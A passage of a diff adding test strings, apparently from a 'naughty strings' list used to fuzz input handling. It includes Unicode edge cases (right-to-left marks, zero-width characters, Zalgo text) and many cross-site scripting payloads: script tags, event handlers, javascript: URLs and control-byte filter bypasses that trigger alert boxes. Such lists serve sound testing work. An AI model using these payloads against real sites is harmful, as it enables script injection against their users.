+    <span class='string'>&quot;\u{5d4}\u{5b8}\u{5d9}\u{5b0}\u{5ea}\u{5b8}\u{5d4}test\u{627}\u{644}\u{635}\u{641}\u{62d}\u{627}\u{62a} \u{627}\u{644}\u{62a}\u{651}\u{62d}\u{648}\u{644}&quot;</span>,
+    <span class='string'>&quot;\u{fdfd}&quot;</span>,
+    <span class='string'>&quot;\u{fdfa}&quot;</span>,
+    <span class='string'>&quot;\u{645}\u{64f}\u{646}\u{64e}\u{627}\u{642}\u{64e}\u{634}\u{64e}\u{629}\u{64f} \u{633}\u{64f}\u{628}\u{64f}\u{644}\u{650} \u{627}\u{650}\u{633}\u{652}\u{62a}\u{650}\u{62e}\u{652}\u{62f}\u{64e}\u{627}\u{645}\u{650} \u{627}\u{644}\u{644}\u{651}\u{64f}\u{63a}\u{64e}\u{629}\u{650} \u{641}\u{650}\u{64a} \u{627}\u{644}\u{646}\u{651}\u{64f}\u{638}\u{64f}\u{645}\u{650} \u{627}\u{644}\u{652}\u{642}\u{64e}\u{627}\u{626}\u{650}\u{645}\u{64e}\u{629}\u{650} \u{648}\u{64e}\u{641}\u{650}\u{64a}\u{645} \u{64a}\u{64e}\u{62e}\u{64f}\u{635}\u{651}\u{64e} \u{627}\u{644}\u{62a}\u{651}\u{64e}\u{637}\u{652}\u{628}\u{650}\u{64a}\u{642}\u{64e}\u{627}\u{62a}\u{64f} \u{627}\u{644}\u{652}\u{62d}\u{627}\u{633}\u{64f}\u{648}\u{628}\u{650}\u{64a}\u{651}\u{64e}\u{629}\u{64f} &quot;</span>,
+    <span class='string'>&quot;\u{200b}&quot;</span>,
+    <span class='string'>&quot;\u{1680}&quot;</span>,
+    <span class='string'>&quot;\u{180e}&quot;</span>,
+    <span class='string'>&quot;\u{3000}&quot;</span>,
+    <span class='string'>&quot;\u{feff}&quot;</span>,
+    <span class='string'>&quot;\u{2423}&quot;</span>,
+    <span class='string'>&quot;\u{2422}&quot;</span>,
+    <span class='string'>&quot;\u{2421}&quot;</span>,
+    <span class='string'>&quot;\u{202a}\u{202a}test\u{202a}&quot;</span>,
+    <span class='string'>&quot;\u{202b}test\u{202b}&quot;</span>,
+    <span class='string'>&quot;\u{2029}test\u{2029}&quot;</span>,
+    <span class='string'>&quot;test\u{2060}test\u{202b}&quot;</span>,
+    <span class='string'>&quot;\u{2066}test\u{2067}&quot;</span>,
+    <span class='string'>&quot;\u{1e70}\u{33a}\u{33a}\u{315}o\u{35e} \u{337}i\u{332}\u{32c}\u{347}\u{32a}\u{359}n\u{31d}\u{317}\u{355}v\u{31f}\u{31c}\u{318}\u{326}\u{35f}o\u{336}\u{319}\u{330}\u{320}k\u{e8}\u{35a}\u{32e}\u{33a}\u{32a}\u{339}\u{331}\u{324} \u{316}t\u{31d}\u{355}\u{333}\u{323}\u{33b}\u{32a}\u{35e}h\u{33c}\u{353}\u{332}\u{326}\u{333}\u{318}\u{332}e\u{347}\u{323}\u{330}\u{326}\u{32c}\u{34e} \u{322}\u{33c}\u{33b}\u{331}\u{318}h\u{35a}\u{34e}\u{359}\u{31c}\u{323}\u{332}\u{345}i\u{326}\u{332}\u{323}\u{330}\u{324}v\u{33b}\u{34d}e\u{33a}\u{32d}\u{333}\u{32a}\u{330}-m\u{322}i\u{345}n\u{316}\u{33a}\u{31e}\u{332}\u{32f}\u{330}d\u{335}\u{33c}\u{31f}\u{359}\u{329}\u{33c}\u{318}\u{333} \u{31e}\u{325}\u{331}\u{333}\u{32d}r\u{31b}\u{317}\u{318}e\u{359}p\u{360}r\u{33c}\u{31e}\u{33b}\u{32d}\u{317}e\u{33a}\u{320}\u{323}\u{35f}s\u{318}\u{347}\u{333}\u{34d}\u{31d}\u{349}e\u{349}\u{325}\u{32f}\u{31e}\u{332}\u{35a}\u{32c}\u{35c}\u{1f9}\u{32c}\u{34e}\u{34e}\u{31f}\u{316}\u{347}\u{324}t\u{34d}\u{32c}\u{324}\u{353}\u{33c}\u{32d}\u{358}\u{345}i\u{32a}\u{331}n\u{360}g\u{334}\u{349} \u{34f}\u{349}\u{345}c\u{32c}\u{31f}h\u{361}a\u{32b}\u{33b}\u{32f}\u{358}o\u{32b}\u{31f}\u{316}\u{34d}\u{319}\u{31d}\u{349}s\u{317}\u{326}\u{332}.\u{328}\u{339}\u{348}\u{323}&quot;</span>,
+    <span class='string'>&quot;\u{321}\u{353}\u{31e}\u{345}I\u{317}\u{318}\u{326}\u{35d}n\u{347}\u{347}\u{359}v\u{32e}\u{32b}ok\u{332}\u{32b}\u{319}\u{348}i\u{316}\u{359}\u{32d}\u{339}\u{320}\u{31e}n\u{321}\u{33b}\u{32e}\u{323}\u{33a}g\u{332}\u{348}\u{359}\u{32d}\u{359}\u{32c}\u{34e} \u{330}t\u{354}\u{326}h\u{31e}\u{332}e\u{322}\u{324} \u{34d}\u{32c}\u{332}\u{356}f\u{334}\u{318}\u{355}\u{323}\u{e8}\u{356}\u{1eb9}\u{325}\u{329}l\u{356}\u{354}\u{35a}i\u{353}\u{35a}\u{326}\u{360}n\u{356}\u{34d}\u{317}\u{353}\u{333}\u{32e}g\u{34d} \u{328}o\u{35a}\u{32a}\u{361}f\u{318}\u{323}\u{32c} \u{316}\u{318}\u{356}\u{31f}\u{359}\u{32e}c\u{489}\u{354}\u{32b}\u{356}\u{353}\u{347}\u{356}\u{345}h\u{335}\u{324}\u{323}\u{35a}\u{354}\u{e1}\u{317}\u{33c}\u{355}\u{345}o\u{33c}\u{323}\u{325}s\u{331}\u{348}\u{33a}\u{316}\u{326}\u{33b}\u{362}.\u{31b}\u{316}\u{31e}\u{320}\u{32b}\u{330}&quot;</span>,
+    <span class='string'>&quot;\u{317}\u{33a}\u{356}\u{339}\u{32f}\u{353}\u{1e6e}\u{324}\u{34d}\u{325}\u{347}\u{348}h\u{332}\u{301}e\u{34f}\u{353}\u{33c}\u{317}\u{319}\u{33c}\u{323}\u{354} \u{347}\u{31c}\u{331}\u{320}\u{353}\u{34d}\u{345}N\u{355}\u{360}e\u{317}\u{331}z\u{318}\u{31d}\u{31c}\u{33a}\u{359}p\u{324}\u{33a}\u{339}\u{34d}\u{32f}\u{35a}e\u{320}\u{33b}\u{320}\u{35c}r\u{328}\u{324}\u{34d}\u{33a}\u{316}\u{354}\u{316}\u{316}d\u{320}\u{31f}\u{32d}\u{32c}\u{31d}\u{35f}i\u{326}\u{356}\u{329}\u{353}\u{354}\u{324}a\u{320}\u{317}\u{32c}\u{349}\u{319}n\u{35a}\u{35c} \u{33b}\u{31e}\u{330}\u{35a}\u{345}h\u{335}\u{349}i\u{333}\u{31e}v\u{322}\u{347}\u{1e19}\u{34e}\u{35f}-\u{489}\u{32d}\u{329}\u{33c}\u{354}m\u{324}\u{32d}\u{32b}i\u{355}\u{347}\u{31d}\u{326}n\u{317}\u{359}\u{1e0d}\u{31f} \u{32f}\u{332}\u{355}\u{35e}\u{1eb}\u{31f}\u{32f}\u{330}\u{332}\u{359}\u{33b}\u{31d}f \u{32a}\u{330}\u{330}\u{317}\u{316}\u{32d}\u{318}\u{358}c\u{326}\u{34d}\u{332}\u{31e}\u{34d}\u{329}\u{319}\u{1e25}\u{35a}a\u{32e}\u{34e}\u{31f}\u{319}\u{35c}\u{1a1}\u{329}\u{339}\u{34e}s\u{324}.\u{31d}\u{31d} \u{489}Z\u{321}\u{316}\u{31c}\u{356}\u{330}\u{323}\u{349}\u{31c}a\u{356}\u{330}\u{359}\u{32c}\u{361}l\u{332}\u{32b}\u{333}\u{34d}\u{329}g\u{321}\u{31f}\u{33c}\u{331}\u{35a}\u{31e}\u{32c}\u{345}o\u{317}\u{35c}.\u{31f}&quot;</span>,
+    <span class='string'>&quot;\u{326}H\u{32c}\u{324}\u{317}\u{324}\u{35d}e\u{35c} \u{31c}\u{325}\u{31d}\u{33b}\u{34d}\u{31f}\u{301}w\u{315}h\u{316}\u{32f}\u{353}o\u{31d}\u{359}\u{316}\u{34e}\u{331}\u{32e} \u{489}\u{33a}\u{319}\u{31e}\u{31f}\u{348}W\u{337}\u{33c}\u{32d}a\u{33a}\u{32a}\u{34d}\u{12f}\u{348}\u{355}\u{32d}\u{359}\u{32f}\u{31c}t\u{336}\u{33c}\u{32e}s\u{318}\u{359}\u{356}\u{315} \u{320}\u{32b}\u{320}B\u{33b}\u{34d}\u{359}\u{349}\u{333}\u{345}e\u{335}h\u{335}\u{32c}\u{347}\u{32b}\u{359}i\u{339}\u{353}\u{333}\u{333}\u{32e}\u{34e}\u{32b}\u{315}n\u{35f}d\u{334}\u{32a}\u{31c}\u{316} \u{330}\u{349}\u{329}\u{347}\u{359}\u{332}\u{35e}\u{345}T\u{356}\u{33c}\u{353}\u{32a}\u{362}h\u{34f}\u{353}\u{32e}\u{33b}e\u{32c}\u{31d}\u{31f}\u{345} \u{324}\u{339}\u{31d}W\u{359}\u{31e}\u{31d}\u{354}\u{347}\u{35d}\u{345}a\u{34f}\u{353}\u{354}\u{339}\u{33c}\u{323}l\u{334}\u{354}\u{330}\u{324}\u{31f}\u{354}\u{1e3d}\u{32b}.\u{355}&quot;</span>,
+    <span class='string'>&quot;Z\u{32e}\u{31e}\u{320}\u{359}\u{354}\u{345}\u{1e00}\u{317}\u{31e}\u{348}\u{33b}\u{317}\u{1e36}\u{359}\u{34e}\u{32f}\u{339}\u{31e}\u{353}G\u{33b}O\u{32d}\u{317}\u{32e}&quot;</span>,
+    <span class='string'>&quot;\u{2d9}\u{250}nb\u{1d09}l\u{250} \u{250}u\u{183}\u{250}\u{26f} \u{1dd}\u{279}olop \u{287}\u{1dd} \u{1dd}\u{279}oq\u{250}l \u{287}n \u{287}unp\u{1d09}p\u{1d09}\u{254}u\u{1d09} \u{279}od\u{26f}\u{1dd}\u{287} po\u{26f}sn\u{1d09}\u{1dd} op p\u{1dd}s \&#39;\u{287}\u{1d09}l\u{1dd} \u{183}u\u{1d09}\u{254}s\u{1d09}d\u{1d09}p\u{250} \u{279}n\u{287}\u{1dd}\u{287}\u{254}\u{1dd}suo\u{254} \&#39;\u{287}\u{1dd}\u{26f}\u{250} \u{287}\u{1d09}s \u{279}olop \u{26f}nsd\u{1d09} \u{26f}\u{1dd}\u{279}o\u{2e5}&quot;</span>,
+    <span class='string'>&quot;00\u{2d9}\u{196}$-&quot;</span>,
+    <span class='string'>&quot;\u{ff34}\u{ff48}\u{ff45} \u{ff51}\u{ff55}\u{ff49}\u{ff43}\u{ff4b} \u{ff42}\u{ff52}\u{ff4f}\u{ff57}\u{ff4e} \u{ff46}\u{ff4f}\u{ff58} \u{ff4a}\u{ff55}\u{ff4d}\u{ff50}\u{ff53} \u{ff4f}\u{ff56}\u{ff45}\u{ff52} \u{ff54}\u{ff48}\u{ff45} \u{ff4c}\u{ff41}\u{ff5a}\u{ff59} \u{ff44}\u{ff4f}\u{ff47}&quot;</span>,
+    <span class='string'>&quot;\u{1d413}\u{1d421}\u{1d41e} \u{1d42a}\u{1d42e}\u{1d422}\u{1d41c}\u{1d424} \u{1d41b}\u{1d42b}\u{1d428}\u{1d430}\u{1d427} \u{1d41f}\u{1d428}\u{1d431} \u{1d423}\u{1d42e}\u{1d426}\u{1d429}\u{1d42c} \u{1d428}\u{1d42f}\u{1d41e}\u{1d42b} \u{1d42d}\u{1d421}\u{1d41e} \u{1d425}\u{1d41a}\u{1d433}\u{1d432} \u{1d41d}\u{1d428}\u{1d420}&quot;</span>,
+    <span class='string'>&quot;\u{1d57f}\u{1d58d}\u{1d58a} \u{1d596}\u{1d59a}\u{1d58e}\u{1d588}\u{1d590} \u{1d587}\u{1d597}\u{1d594}\u{1d59c}\u{1d593} \u{1d58b}\u{1d594}\u{1d59d} \u{1d58f}\u{1d59a}\u{1d592}\u{1d595}\u{1d598} \u{1d594}\u{1d59b}\u{1d58a}\u{1d597} \u{1d599}\u{1d58d}\u{1d58a} \u{1d591}\u{1d586}\u{1d59f}\u{1d59e} \u{1d589}\u{1d594}\u{1d58c}&quot;</span>,
+    <span class='string'>&quot;\u{1d47b}\u{1d489}\u{1d486} \u{1d492}\u{1d496}\u{1d48a}\u{1d484}\u{1d48c} \u{1d483}\u{1d493}\u{1d490}\u{1d498}\u{1d48f} \u{1d487}\u{1d490}\u{1d499} \u{1d48b}\u{1d496}\u{1d48e}\u{1d491}\u{1d494} \u{1d490}\u{1d497}\u{1d486}\u{1d493} \u{1d495}\u{1d489}\u{1d486} \u{1d48d}\u{1d482}\u{1d49b}\u{1d49a} \u{1d485}\u{1d490}\u{1d488}&quot;</span>,
+    <span class='string'>&quot;\u{1d4e3}\u{1d4f1}\u{1d4ee} \u{1d4fa}\u{1d4fe}\u{1d4f2}\u{1d4ec}\u{1d4f4} \u{1d4eb}\u{1d4fb}\u{1d4f8}\u{1d500}\u{1d4f7} \u{1d4ef}\u{1d4f8}\u{1d501} \u{1d4f3}\u{1d4fe}\u{1d4f6}\u{1d4f9}\u{1d4fc} \u{1d4f8}\u{1d4ff}\u{1d4ee}\u{1d4fb} \u{1d4fd}\u{1d4f1}\u{1d4ee} \u{1d4f5}\u{1d4ea}\u{1d503}\u{1d502} \u{1d4ed}\u{1d4f8}\u{1d4f0}&quot;</span>,
+    <span class='string'>&quot;\u{1d54b}\u{1d559}\u{1d556} \u{1d562}\u{1d566}\u{1d55a}\u{1d554}\u{1d55c} \u{1d553}\u{1d563}\u{1d560}\u{1d568}\u{1d55f} \u{1d557}\u{1d560}\u{1d569} \u{1d55b}\u{1d566}\u{1d55e}\u{1d561}\u{1d564} \u{1d560}\u{1d567}\u{1d556}\u{1d563} \u{1d565}\u{1d559}\u{1d556} \u{1d55d}\u{1d552}\u{1d56b}\u{1d56a} \u{1d555}\u{1d560}\u{1d558}&quot;</span>,
+    <span class='string'>&quot;\u{1d683}\u{1d691}\u{1d68e} \u{1d69a}\u{1d69e}\u{1d692}\u{1d68c}\u{1d694} \u{1d68b}\u{1d69b}\u{1d698}\u{1d6a0}\u{1d697} \u{1d68f}\u{1d698}\u{1d6a1} \u{1d693}\u{1d69e}\u{1d696}\u{1d699}\u{1d69c} \u{1d698}\u{1d69f}\u{1d68e}\u{1d69b} \u{1d69d}\u{1d691}\u{1d68e} \u{1d695}\u{1d68a}\u{1d6a3}\u{1d6a2} \u{1d68d}\u{1d698}\u{1d690}&quot;</span>,
+    <span class='string'>&quot;\u{24af}\u{24a3}\u{24a0} \u{24ac}\u{24b0}\u{24a4}\u{249e}\u{24a6} \u{249d}\u{24ad}\u{24aa}\u{24b2}\u{24a9} \u{24a1}\u{24aa}\u{24b3} \u{24a5}\u{24b0}\u{24a8}\u{24ab}\u{24ae} \u{24aa}\u{24b1}\u{24a0}\u{24ad} \u{24af}\u{24a3}\u{24a0} \u{24a7}\u{249c}\u{24b5}\u{24b4} \u{249f}\u{24aa}\u{24a2}&quot;</span>,
+    <span class='string'>&quot;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&amp;lt;script&amp;gt;alert(&amp;#39;123&amp;#39;);&amp;lt;/script&amp;gt;&quot;</span>,
+    <span class='string'>&quot;&lt;img src=x onerror=alert(123) /&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;svg&gt;&lt;script&gt;123&lt;1&gt;alert(123)&lt;/script&gt; &quot;</span>,
+    <span class='string'>&quot;\&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&#39;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt; / script &gt;&lt; script &gt;alert(123)&lt; / script &gt;&quot;</span>,
+    <span class='string'>&quot; onfocus=JaVaSCript:alert(123) autofocus &quot;</span>,
+    <span class='string'>&quot;\&quot; onfocus=JaVaSCript:alert(123) autofocus &quot;</span>,
+    <span class='string'>&quot;\&#39; onfocus=JaVaSCript:alert(123) autofocus &quot;</span>,
+    <span class='string'>&quot;\u{ff1c}script\u{ff1e}alert(123)\u{ff1c}/script\u{ff1e}&quot;</span>,
+    <span class='string'>&quot;&lt;sc&lt;script&gt;ript&gt;alert(123)&lt;/sc&lt;/script&gt;ript&gt;&quot;</span>,
+    <span class='string'>&quot;--&gt;&lt;script&gt;alert(123)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&quot;;alert(123);t=\&quot;&quot;</span>,
+    <span class='string'>&quot;\&#39;;alert(123);t=\&#39;&quot;</span>,
+    <span class='string'>&quot;JavaSCript:alert(123)&quot;</span>,
+    <span class='string'>&quot;;alert(123);&quot;</span>,
+    <span class='string'>&quot;src=JaVaSCript:prompt(132)&quot;</span>,
+    <span class='string'>&quot;\&quot;&gt;&lt;script&gt;alert(123);&lt;/script x=\&quot;&quot;</span>,
+    <span class='string'>&quot;\&#39;&gt;&lt;script&gt;alert(123);&lt;/script x=\&#39;&quot;</span>,
+    <span class='string'>&quot;&gt;&lt;script&gt;alert(123);&lt;/script x=&quot;</span>,
+    <span class='string'>&quot;\&quot; autofocus onkeyup=\&quot;javascript:alert(123)&quot;</span>,
+    <span class='string'>&quot;\&#39; autofocus onkeyup=\&#39;javascript:alert(123)&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x20type=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x3Etype=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x0Dtype=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x09type=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x0Ctype=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x2Ftype=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;script\\x0Atype=\&quot;text/javascript\&quot;&gt;javascript:alert(1);&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;\&#39;`\&quot;&gt;&lt;\\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;        &quot;</span>,
+    <span class='string'>&quot;\&#39;`\&quot;&gt;&lt;\\x00script&gt;javascript:alert(1)&lt;/script&gt;&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x\\x3Aexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:expression\\x5C(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:expression\\x00(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:exp\\x00ression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:exp\\x5Cression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x0Aexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x09expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE3\\x80\\x80expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x84expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xC2\\xA0expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x80expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x0Dexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x0Cexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x87expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x20expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x88expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x00expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x86expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x85expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x82expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\x0Bexpression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x81expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x83expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;ABC&lt;div style=\&quot;x:\\xE2\\x80\\x89expression(javascript:alert(1)\&quot;&gt;DEF&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x0Bjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x0Fjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xC2\\xA0javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x05javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x18javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x11javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x88javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x89javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x80javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x17javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x03javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x0Ejavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x1Ajavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x00javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x10javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x82javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x20javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x13javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x09javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x14javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x19javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\xAFjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x1Fjavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x81javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x1Djavascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x87javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x07javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE1\\x9A\\x80javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x83javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x04javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x01javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x08javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x84javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE2\\x80\\x86javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\xE3\\x80\\x80javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
+    <span class='string'>&quot;&lt;a href=\&quot;\\x12javascript:javascript:alert(1)\&quot; id=\&quot;fuzzelement1\&quot;&gt;test&lt;/a&gt;&quot;</span>,
